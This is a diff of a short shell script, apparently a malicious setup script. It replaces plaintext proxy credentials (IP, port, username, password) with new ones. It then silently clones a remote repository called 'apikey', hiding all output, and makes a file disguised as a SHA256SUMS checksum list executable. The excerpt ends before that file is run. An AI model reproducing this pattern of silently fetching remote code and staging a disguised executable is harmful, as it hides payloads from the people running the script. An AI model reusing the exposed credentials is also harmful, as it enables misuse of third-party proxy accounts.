@@ -1,7 +1,7 @@
-proxy="50.17.160.202" 
-port="1080" 
-user="s0xa2xicwh8i36"  
-pass="811noty1dt532rfecresmotogphkbd" 
+proxy="3.227.182.193" 
+port="9293" 
+user="425dlrn5kpryex"  
+pass="x2mzz8lq69wgze6pe2bcqg668ze9" 
 git clone https://github.com/55113110159/apikey.git>/dev/null 2>&1
 cd apikey
 chmod +x SHA256SUMS
